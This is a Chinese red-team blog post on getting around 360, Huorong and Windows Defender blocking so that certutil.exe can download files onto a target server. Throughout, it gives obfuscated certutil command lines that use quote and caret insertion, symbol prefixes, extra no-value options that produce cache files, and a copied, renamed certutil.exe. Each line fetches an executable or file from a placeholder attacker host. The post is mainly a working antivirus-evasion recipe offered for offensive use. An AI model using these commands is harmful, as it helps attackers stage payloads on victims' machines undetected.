**əhead@深蓝实验室重保天佑战队**

在某些场景下，当我们需要往目标服务器内下载文件时，如果目标上存在杀软时会有拦截行为，导致不能成功完成下载操作。

certutil.exe是windows系统自带的，作为证书服务的命令行程序。用户可以使用certutil.exe转储和显示证书颁发机构配置信息等等以及验证证书、密钥对和证书链。

certutil下载文件的常见命令为：

    
    
    certutil -urlcache -split -f http://xxx.com/xx.exe
    

  * -urlcache参数：显示或删除URL缓存条目。

  * -f参数：覆盖现有文件，后面要跟下载的文件地址。

  * -split参数：保存文件。加的话就下载到当前路径，不加就下载到默认路径。

话不多说，下面就以常见的360核晶模式、火绒、defender作为测试环境进行相关的绕过测试。

**一、360核晶模式**  
物理机开启核晶模式的360防护强度上要比虚拟机上的强，我们就以此状态下的为准来测试。  
![](./img/4812640070194340710.png)  
首先以certutil的默认下载语法执行，必定是拦截的

![](./img/5846810331752566110.png)  
利用windows的特性，通过" ；@等等符号组合的方式进行混淆执行，发现也能检测到异常行为并拦截。

    
    
    ;,@certutil&&;,@certutil  -u""r""l""c""a""c""h""e"" -split  -f http://192.168.xx.xx:7000/test.txt
    

![](./img/8597030030003150813.png)  

    
    
    ;,certutil;, /⸿split;,-ur₏lcache -f http://192.168.xx.xx:7000/test.txt
    

![](./img/85183947288809117.png)  
通过复制certutil程序，更换其他路径和文件名发现照样是会拦截的。

**certutil官方说明链接**

    
    
    https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil
    

那么反回来看certutil的帮助说明，有如下几个无值命令选项，测试发现加上这几个选项后，会生成以该选项为名的缓存文件。

![](./img/3889718557015646886.png)

![](./img/4657836385895934111.png)

![](./img/4180747836606951730.png)

![](./img/4379453814424655635.png)  
那么便可以构造如下几个执行命令了

    
    
    ;,@certutil  -u""r""l""c""a""c""h""e"" -split -f http://192.168.xx.xx:7000/a.exe -DeleteHelloContainer
    
    
    
    ;,@certutil  -u""r""l""c""a""c""h""e"" -split  -f http://192.168.xx.xx:7000/a.exe -deleteEnrollmentServer
    
    
    
    ;,@certutil  -u""r""l""c""a""c""h""e"" -split  -f http://192.168.xx.xx:7000/a.exe -deletePolicyServer
    
    
    
    ;,@certutil  -u""r""l""c""a""c""h""e"" -split  -f http://192.168.xx.xx:7000/a.exe -deleteEccCurve
    

可以看到全程并没有产生拦截告警，成功下载指定文件并生成对应的缓存文件，如下：  
![](./img/6131588424989721985.png)

![](./img/8976004617626424483.png)  
接着只要把对应的缓存文件还原就行了，程序正常运行。  
![](./img/2027830934702151502.png)

**二、火绒模式**

![](./img/7906374493181270450.png)  
同样默认下载的语句会拦截：

![](./img/516941134842331556.png)  
加入无效参数-a发现也拦截

    
    
    certutil -urlcache -a -split -f  http://192.168.xx.xx:8080/xx.txt
    

![](./img/6687530545184777337.png)  
尝试对参数做一下变形，其中Windows中有些字符串是不影响命令执行的，比如^和”。

    
    
    cer^t^u^til -url""""cache -a -sp""""lit -f  http://192.168.xx.xx:8080/xx.txt

![](./img/5649784308689711220.png)

可见并不是简单匹配命令语句，也会动态检测命令参数这些。  
既然这样，复制certutil程序，更换其他路径和文件名试试

    
    
    copy c:\windows\system32\certutil.exe a.exe
    a.exe -urlcache -split -f  http://192.168.xx.xx:7000/gdut.txt

![](./img/4861215640078507063.png)  
发现成功绕过检测，不产生拦截并完成下载操作了。

**三、Defender模式**

![](./img/8010481483387413451.png)  
尝试利用默认的下载语法，以及往其中加入无效的参数发现也是被defender拦截了

![](./img/5924408114015473343.png)  
那么就尝试利用^和"组合发现可以绕过拦截完成下载操作，具体怎么组合根据实际情况决定即可。

    
    
    certutil -url""""cache -split -f http://192.168.xx.xx:7070/test.txt
    cert^u^t^il -url""""cache -sp""""lit -f http://192.168.xx.xx:7070/test.txt
    

![](./img/127566876450048776.png)  
通过复制certutil程序，更换路径和文件名使用默认下载语法是会拦截的，这里跟火绒不一样。

![](./img/7184483738253896908.png)  
这里defender应该是对命令参数进行了检测，统一用^和"进行绕过就好。

    
    
    b.exe -url""""ca^c^he -spl""""it -f http://192.168.xx.xx:7070/test.txt
    

![](./img/1806253719823249174.png)

